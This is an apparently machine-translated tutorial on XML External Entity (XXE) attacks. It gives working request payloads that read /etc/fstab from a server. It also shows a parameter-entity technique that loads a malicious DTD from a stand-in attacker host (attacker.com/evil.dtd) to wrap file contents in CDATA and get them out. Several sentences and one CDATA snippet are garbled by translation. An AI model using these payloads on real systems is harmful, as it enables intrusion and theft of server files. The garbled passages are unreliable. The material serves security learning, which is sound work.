## Restrictions
For the classic usage of XXE, it is usually more convenient to read the file, but it also determines that the content element that can be parsed must be an XML document.    

As an example:   
request:   
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "file:///etc/fstab">;
]>
<foo>
  &bar;
</foo>
```   
(usual) response:   
```
HTTP / 1.0 500 Internal Server Error

File "file: /// etc / fstab", line 3
lxml.etree.XMLSyntaxError: Specification mandate value for attribute system, line 3, column 15 ...
```   
/etc/fstabIs a file containing some characters that look like XML (even if they are not XML). This will cause the XML parser to try to parse these elements, only to notice that it is not a valid XML document.

### THEREFORE~!
this limits XML External Entities (XXE) in two important ways.   
1. XXE can only be used to get files or responses containing "valid" XML   
2. XXE cannot be used to get binary files   


## XML External Entities (XXE) Restriction Solution
In fact, this also uses external parameter entities, which solves some problems brought by named entities and ordinary entities   
Attackers use XML external entities (XXE) attack the main problem facing is that it is very easy to hit a brick wall trying to exfiltrate not a valid XML file (XML contains special characters, such as when, for example, plain text file file `&`, `<` and `>`).   

### Solution 
XML has solved this problem, because some legal situations may require storing XML special characters in XML files. CDATAThe XML parser ignores special XML characters in (Character Data) tags.     
`<data> <! [CDATA [<"'&> characters are ok in here]]> </ data>`

Therefore, an attacker could send a request similar to the following:   
request:   
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE data [
  <!ENTITY start "<![CDATA[">
  <!ENTITY file SYSTEM 
"file:///etc/fstab">
  <!ENTITY end "]]>">
  <!ENTITY all "&start;&file;&end;">
]>
<data>&all;</data>
```   
With an expected response of ~:   
```
HTTP/1.0 200 OK

# /etc/fstab: static file system informa...
#
# <file system> <mount point> <type> ...
proc  /proc  proc  defaults  0  0
# /dev/sda5
UUID=be35a709-c787-4198-a903-d5fdc80ab2f... # /dev/sda6
UUID=cee15eca-5b2e-48ad-9735-eae5ac14bc9...

/dev/scd0  /media/cdrom0  udf,iso9660 ...
```     
But it doesn't actually work because the XML specification does not allow the use of external entities with internal entities. LOL....     

Example of the internal entity code:    
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >]>
```     
example of the external entitiy code:    
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

But an attacker can always bullshit their way through... 

#### Focus 1 
There are two types of entities, internal entities and external entities . The example we gave above is an internal entity, but the entity can actually be referenced from an external dtd file.    
We see the following code:     
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
#### Focus 2 
We have divided the entity into two factions (internal entity and external external), but actually from another perspective, the entity can also be divided into two factions (general entity and parameter entity)    
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPe root [
    <!ENTITY outfile SYSTEM "outfile.xml">
]>
<root><outfile>&outfile;</outfile></root>
```

#### Parameter entity:
(1) use `%Entity name` ( there is a space no less ) defined in the DTD, and can only be used in the DTD `%Entity name;` reference   
(2) only in the DTD file, declare the parameter entity to refer to other entities   
(3) and general entity as parameters Entities can also be referenced externally   

Sample code:    
``` 
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;
```

Whats next?

So we have general entities. this is what we have seen so far in this documentation. as well as for parameter entities. I'll show you what parameter entities look like its the same as general entities except that it exists inside the DTD and starts with a% as a prefix to indicate that the XML parser is defining a parameter entity (not generally an entitiy). So ill show you en entitiy parameter is used to define a common entity which is then called inside the XML document.    
request:   
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE data [
  <!ENTITY % paramEntity
  "<!ENTITY genEntity 'bar'>">
  %paramEntity;
]>
<data>&genEntity;</data>
```   
Expected response:    
```
HTTP/1.0 200 OK

bar
```     
taking into account the that example the attacker can now create an on attacker.com/evil.dtd hosted malicious DTD, the CDATA example above would convert into work the attackers.    
request:    
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```    
attackers DTD (attacker.com/evil.dtd)    
```
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```    

Parsing explained:    
When an attacker sends the above request, the XML parser will first % dtd try to process the parameter entity by making a request to http://attacker.com/evil.dtd .    

Once the attacker's DTD is downloaded, the XML parser will load the `%file` parameter entity (from evil.dtd ), in this case yes `/etc/fstab`. It will then `<![CDATA[ ]]>` use the `%startand` `%end` parameter entities to wrap the contents of the file in tags, respectively, and store them in another named parameter entity `%all`.    
The core of this trick is to %allcreate a called universal entity &fileContents;that can be included in the attacker as part of the response.    
The result is a reply to the attacker, and `/etc/fstab` the contents of the file ( ) are included in the `CDATA` tag.    

  